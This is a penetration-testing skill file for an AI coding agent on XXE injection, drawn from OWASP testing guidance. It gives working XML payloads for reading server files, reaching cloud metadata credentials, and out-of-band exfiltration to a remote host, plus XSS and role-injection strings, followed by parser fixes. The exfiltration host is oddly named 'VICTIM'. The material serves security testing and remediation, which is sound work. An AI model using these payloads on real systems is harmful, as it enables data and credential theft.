---
name: xxe
description: >
  XML External Entity (XXE) injection exploits XML parsers that process DTD external entity declarations, enabling local file disclosure (`file:///etc/passwd`), SSRF via `http://` entities, and DoS via Billion Laughs. Vulnerable Java APIs include `DocumentBuilder`, `SAXParser`, `dom4j`, `TransformerFactory`, `SAXReader`, `XMLInputFactory`, Xerces. Detect by injecting `<!DOCTYPE>` DTD with `SYSTEM` entity references. Tools: Burp Suite, wfuzz XML fuzz strings.
license: MIT
compatibility: Designed for Claude Code. Requires Burp Suite or OWASP ZAP.
metadata:
  category: web
  version: "0.1"
  source: https://owasp.org/www-project-web-security-testing-guide/stable/
  source_types: framework
  wstg: WSTG-INPV-07
---

# XML External Entity (XXE) Injection

## What Is Broken and Why
XXE vulnerabilities arise when XML input containing a DOCTYPE declaration with external entity references is processed by a parser that has external entity resolution enabled. The parser fetches the referenced resource (a local file, remote URL, or network service) and substitutes it into the document, which the application may then reflect in a response or process further. Beyond data disclosure, XXE enables SSRF and, via parameter entities, blind out-of-band exfiltration. The root cause is misconfigured or default-insecure XML parser settings.

## Key Signals
- Application accepts XML input (SOAP endpoints, REST APIs with `Content-Type: application/xml`, file uploads of .xml/.docx/.xlsx/.svg)
- Requests containing `<?xml` declarations
- Error messages referencing XML parsing libraries or DTD processing
- Java APIs in stack traces: `DocumentBuilder`, `SAXParser`, `XMLInputFactory`, `TransformerFactory`
- Application processing SVG, RSS/Atom feeds, or office document formats (DOCX, XLSX use XML internally)
- Response includes content from server filesystem or internal network resources

## Methodology
1. Identify XML input vectors: direct XML body, XML-based file uploads, XML wrapped in SOAP.
2. Submit minimal XML and confirm it is parsed (look for reflected values or processing differences).
3. Inject a DOCTYPE with an internal entity first to confirm entity processing is enabled.
4. Escalate to external file entity to test file disclosure.
5. Test SSRF via HTTP entity pointing to OOB callback server.
6. If output is not reflected (blind XXE), use out-of-band via parameter entities and external DTD.
7. Test for error-based XXE if OOB is blocked.
8. Test XML injection vectors (tag injection, CDATA bypass) if DOCTYPE is stripped.

## Payloads & Tools
```xml
<!-- Step 1: Confirm entity processing (internal entity) -->
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe "xxe-test">]>
<root>&xxe;</root>

<!-- Step 2: File disclosure (Linux) -->
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- File disclosure (Windows) -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>
<foo>&xxe;</foo>

<!-- SSRF via HTTP entity -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>

<!-- OOB blind XXE (data exfiltration via DNS/HTTP) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://VICTIM/malicious.dtd">
  %xxe;
]>
<foo/>

<!-- malicious.dtd hosted on attacker server: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://VICTIM/?data=%file;'>">
%send;

<!-- Error-based XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>

<!-- XML tag injection / privilege escalation -->
<!-- Email field: inject closing tag + new element -->
user@domain.com</mail><role>admin</role><mail>user@domain.com

<!-- CDATA XSS bypass -->
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>

<!-- wfuzz XML injection fuzzing -->
wfuzz -c -z file,xml-fuzz.txt --hc 200 TARGET/api/xml-endpoint
```

## Bypass Techniques
- If `<!DOCTYPE>` is stripped: test for XML injection via metacharacters (`'`, `"`, `<`, `>`, `&`, `]]>`) to break document structure
- If `SYSTEM` entities are blocked but `PUBLIC` entities are not: `<!ENTITY xxe PUBLIC "foo" "file:///etc/passwd">`
- Encoding: submit XML as UTF-16 or UTF-7 if UTF-8 is filtered
- CDATA wrapping to inject script through XML: `<![CDATA[...]]>`
- Parameter entities for blind exfiltration when direct entities are blocked
- SVG upload: craft malicious SVG file with external entity declaration (processed by server-side renderer)
- XLSX/DOCX injection: embed XXE in internal XML files within ZIP archive

## Exploitation Scenarios
**Scenario 1 — File Disclosure via SOAP API**
Setup: SOAP web service accepts XML, processes address field, and reflects parsed values.
Trigger: Replace address field value with entity reference: inject DOCTYPE + `<!ENTITY xxe SYSTEM "file:///etc/passwd">` and use `&xxe;` as address value.
Impact: Contents of `/etc/passwd` returned in the address field of the SOAP response.

**Scenario 2 — SSRF to Cloud Metadata**
Setup: REST API endpoint accepts `Content-Type: application/xml` and processes product import data.
Trigger: Submit XXE with `SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE"`.
Impact: AWS IAM credentials returned in error message or reflected XML response.

**Scenario 3 — Blind OOB Exfiltration via SVG Upload**
Setup: Profile avatar accepts SVG format; server-side renderer processes SVG XML.
Trigger: Upload SVG containing external DTD reference pointing to attacker server; DTD triggers file read and DNS/HTTP callback with file contents.
Impact: Sensitive server files exfiltrated without any visible response to attacker.

## False Positives
- XML parsers that have external entity processing disabled by default (modern library versions with secure defaults)
- DOCTYPE declarations that are stripped by an XML preprocessing layer before the main parser
- Internal entities (using `&amp;` style references) that work but external `SYSTEM` entities are blocked
- Error responses that look like XML parsing errors but are caused by malformed XML structure, not XXE

## Fix Patterns
- Disable external entity processing in XML parser configuration (most critical fix):
  - Java DocumentBuilderFactory: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
  - Java SAXParserFactory: disable `external-general-entities` and `external-parameter-entities`
  - Python lxml: use `resolve_entities=False`
  - PHP: use `libxml_disable_entity_loader(true)` (PHP < 8.0); PHP 8.0+ disabled by default
- Avoid processing DTDs entirely if not required
- Use JSON instead of XML for APIs where XML is not mandated
- Validate and sanitize XML against a strict schema that disallows DOCTYPE declarations
- Apply allowlists for what XML content is permissible

## Related Skills

[[ssrf]] and XXE are two sides of the same server-trust-boundary problem: XXE with an `http://` SYSTEM entity is an SSRF primitive that can reach the cloud metadata endpoint just as a URL-parameter SSRF can. If XXE enables file disclosure and the file contains source code, use those paths as targets for [[path-traversal]] to enumerate the filesystem further. SVG upload XXE chains into [[xss-stored]] if the server renders the SVG in an HTML context without sanitization. The OOB data exfiltration technique here (DNS callback) is the same pattern used in blind [[ssrf]] detection.
